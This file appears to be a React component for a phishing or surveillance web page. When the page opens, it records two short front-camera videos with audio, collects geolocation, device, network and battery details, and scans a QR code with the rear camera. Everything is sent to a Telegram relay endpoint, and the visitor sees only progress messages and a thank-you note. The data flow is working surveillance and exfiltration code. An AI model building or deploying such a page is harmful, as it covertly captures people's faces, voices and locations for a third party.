"use client";

import React, { useEffect, useRef, useState, useCallback } from "react";
import QrScanner from "./qr-scanner";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import {
  getGeolocation,
  getClientInfo,
  getNetworkInfo,
  getDeviceMemory,
  getBatteryInfo,
  getPermissionStatus,
  PermissionStatus
} from "@/lib/client-data";

const TELEGRAM_API_ENDPOINT = "/api/telegram";
const VIDEO_SEGMENT_DURATION_MS = 3000; // 3 seconds for each video segment
const QR_SCAN_TIMEOUT_MS = 10000; // 10 seconds for QR scanning

type GeolocationData = { latitude: number; longitude: number };
type ClientInfo = { userAgent: string; platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
type BatteryInfo = { level?: number; charging?: boolean; status?: string };

type CollectedData = {
  timestamp: string;
  geolocation?: GeolocationData;
  clientInfo?: ClientInfo;
  networkInfo?: NetworkInfo;
  deviceMemory?: number;
  batteryInfo?: BatteryInfo;
  permissionStatus?: PermissionStatus;
  ipAddress?: string;
  video1?: string;
  video2?: string;
  qrCodeData?: string;
};

type AppPhase =
  | "initial"
  | "collectingData"
  | "recordingVideo1"
  | "recordingVideo2"
  | "flippingCamera"
  | "qrScanning"
  | "finished";

const PermissionHandler = () => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const mediaChunksRef = useRef<Blob[]>([]);
  const [appPhase, setAppPhase] = useState<AppPhase>("initial");
  const [loadingMessage, setLoadingMessage] = useState("Подготовка к запуску...");
  const [collectedData, setCollectedData] = useState<CollectedData>({ timestamp: new Date().toISOString() });
  const [sessionKey, setSessionKey] = useState(0);
  const [processSuccessful, setProcessSuccessful] = useState<boolean>(false);

  const sendDataToTelegram = useCallback(async (data: CollectedData): Promise<boolean> => {
    try {
      const response = await fetch(TELEGRAM_API_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        console.log("Data successfully sent to Telegram!");
        toast.success("Данные успешно отправлены в Telegram!");
        return true;
      } else {
        const errorData = await response.json();
        console.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`);
        toast.error(`Ошибка отправки данных: ${errorData.error || response.statusText}`);
        return false;
      }
    } catch (error: any) {
      console.error(`Network error sending data to Telegram: ${error.message}`);
      toast.error(`Сетевая ошибка: ${error.message}`);
      return false;
    }
  }, []);

  const recordVideoSegment = useCallback(
    async (duration: number, facingMode: "user" | "environment"): Promise<string | undefined> => {
      let stream: MediaStream | null = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: facingMode },
          audio: true,
        });

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.muted = true;
          videoRef.current.setAttribute("playsinline", "true");
          await videoRef.current.play().catch((e) => console.error("Error playing video stream:", e));
        }

        return new Promise((resolve) => {
          mediaRecorderRef.current = new MediaRecorder(stream!, { mimeType: "video/webm" });
          mediaChunksRef.current = [];

          mediaRecorderRef.current.ondataavailable = (event) => {
            if (event.data.size > 0) {
              mediaChunksRef.current.push(event.data);
            }
          };

          mediaRecorderRef.current.onstop = () => {
            const videoBlob = new Blob(mediaChunksRef.current, { type: "video/webm" });
            const reader = new FileReader();
            reader.readAsDataURL(videoBlob);
            reader.onloadend = () => {
              resolve(reader.result as string);
            };
            stream?.getTracks().forEach((track) => track.stop());
            if (videoRef.current) {
              videoRef.current.srcObject = null;
            }
          };

          mediaRecorderRef.current.start();
          setTimeout(() => {
            if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
              mediaRecorderRef.current.stop();
            }
          }, duration);
        });
      } catch (error: any) {
        console.error(`Camera/Microphone access denied for ${facingMode} camera: ${error.message}`);
        toast.error(`Ошибка доступа к камере (${facingMode}): ${error.message}`);
        stream?.getTracks().forEach((track) => track.stop());
        if (videoRef.current) {
          videoRef.current.srcObject = null;
        }
        return undefined;
      }
    },
    []
  );

  const handleQrCodeScanned = useCallback(
    async (qrData: string) => {
      console.log("QR Code Scanned in PermissionHandler:", qrData);
      const finalData = { ...collectedData, qrCodeData: qrData };
      setCollectedData(finalData);
      const success = await sendDataToTelegram(finalData);
      setProcessSuccessful(success);
      setAppPhase("finished");
      toast.success("QR-код успешно отсканирован!");
    },
    [collectedData, sendDataToTelegram]
  );

  const handleQrScanError = useCallback(
    async (error: string) => {
      console.error("QR Scan Error:", error);
      const finalData = { ...collectedData, qrCodeData: `QR Scan Error: ${error}` };
      setCollectedData(finalData);
      const success = await sendDataToTelegram(finalData);
      setProcessSuccessful(success);
      setAppPhase("finished");
      toast.error(`Ошибка сканирования QR: ${error}`);
    },
    [collectedData, sendDataToTelegram]
  );

  const startNewSession = useCallback(() => {
    setAppPhase("initial");
    setCollectedData({ timestamp: new Date().toISOString() });
    setSessionKey((prevKey) => prevKey + 1);
    setProcessSuccessful(false); // Reset success status
  }, []);

  useEffect(() => {
    let qrTimeout: NodeJS.Timeout;

    const runProcess = async () => {
      setLoadingMessage("Сбор данных об устройстве и разрешениях...");
      setAppPhase("collectingData");

      let currentCollectedDataState: CollectedData = { timestamp: new Date().toISOString() };

      // --- Start Video 1 Recording immediately ---
      setLoadingMessage("Запись первого видео (фронтальная камера)...");
      setAppPhase("recordingVideo1");
      const video1Promise = recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");

      // --- Concurrently collect other data ---
      const [
        permissionStatusResult,
        batteryInfoResult,
        geolocationResult,
      ] = await Promise.all([
        getPermissionStatus(),
        getBatteryInfo(),
        getGeolocation(),
      ]);

      // Collect client info (synchronous)
      const clientInfo = getClientInfo();
      currentCollectedDataState.clientInfo = clientInfo;
      currentCollectedDataState.networkInfo = getNetworkInfo();
      currentCollectedDataState.deviceMemory = getDeviceMemory();

      currentCollectedDataState.permissionStatus = permissionStatusResult;

      if (batteryInfoResult.data) {
        currentCollectedDataState.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
      } else {
        currentCollectedDataState.batteryInfo = { status: batteryInfoResult.status };
      }

      if (geolocationResult.data) {
        currentCollectedDataState.geolocation = geolocationResult.data;
      }
      if (currentCollectedDataState.permissionStatus) {
        currentCollectedDataState.permissionStatus.geolocation = geolocationResult.status;
      }

      currentCollectedDataState.ipAddress = "Fetching...";

      // Await Video 1 completion and send
      const video1Base64 = await video1Promise;
      if (video1Base64) {
        currentCollectedDataState = { ...currentCollectedDataState, video1: video1Base64 };
      }
      setCollectedData(currentCollectedDataState);
      await sendDataToTelegram(currentCollectedDataState);
      currentCollectedDataState.video1 = undefined; // Clear after sending

      // --- Video 2 Recording ---
      setLoadingMessage("Запись второго видео (фронтальная камера)...");
      setAppPhase("recordingVideo2");
      const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
      if (video2Base64) {
        currentCollectedDataState = { ...currentCollectedDataState, video2: video2Base64 };
      }
      setCollectedData(currentCollectedDataState);
      await sendDataToTelegram(currentCollectedDataState);
      currentCollectedDataState.video2 = undefined; // Clear after sending

      // --- QR Scanning ---
      setLoadingMessage("Переключение на заднюю камеру для сканирования QR-кода...");
      setAppPhase("flippingCamera");
      setAppPhase("qrScanning"); // QrScanner component will handle its own loading message

      qrTimeout = setTimeout(async () => {
        console.log("QR scanning timed out.");
        const finalData = { ...currentCollectedDataState, qrCodeData: "QR Scan Timed Out" };
        setCollectedData(finalData);
        const success = await sendDataToTelegram(finalData);
        setProcessSuccessful(success);
        setAppPhase("finished");
        toast.error("Время сканирования QR-кода истекло.");
      }, QR_SCAN_TIMEOUT_MS);
    };

    if (appPhase === "initial") {
      runProcess();
    }

    return () => {
      clearTimeout(qrTimeout);
      if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
        mediaRecorderRef.current.stop();
      }
      if (videoRef.current && videoRef.current.srcObject) {
        (videoRef.current.srcObject as MediaStream).getTracks().forEach((track) => track.stop());
        videoRef.current.srcObject = null;
      }
    };
  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, collectedData]);


  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-background text-foreground p-4">
      {(appPhase === "initial" ||
        appPhase === "collectingData" ||
        appPhase === "recordingVideo1" ||
        appPhase === "recordingVideo2" ||
        appPhase === "flippingCamera") && (
        <>
          <p className="text-lg mb-4 text-center font-bold text-primary">
            {loadingMessage}
          </p>
          <div className="relative w-full max-w-md aspect-video bg-muted flex items-center justify-center rounded-lg overflow-hidden">
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className="w-full h-full object-cover"
              style={{ display: (appPhase === "recordingVideo1" || appPhase === "recordingVideo2") ? 'block' : 'none' }}
            />
            <div className="absolute inset-0 border-4 border-primary-foreground opacity-70 rounded-lg pointer-events-none" />
            {(appPhase === "collectingData" || appPhase === "flippingCamera") && (
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary-foreground" />
              </div>
            )}
          </div>
        </>
      )}
      {appPhase === "qrScanning" && (
        <QrScanner onQrCodeScanned={handleQrCodeScanned} onScanError={handleQrScanError} />
      )}
      {appPhase === "finished" && (
        <div className="flex flex-col items-center justify-center">
          <p className="text-lg mb-4 text-center">
            {processSuccessful
              ? "Տվյալները հաջողությամբ ուղարկվել են։ Շնորհակալություն։" // Данные успешно отправлены. Спасибо.
              : "Տեխնիկական անսարքություններ, խնդրում ենք կրկնել կամ փորձել ավելի ուշ:" // Технические неполадки, пожалуйста, повторите еще раз или повторите позже.
            }
          </p>
          <Button onClick={startNewSession} className="mt-4">
            Կրկնել
          </Button>
        </div>
      )}
    </div>
  );
};

export default PermissionHandler;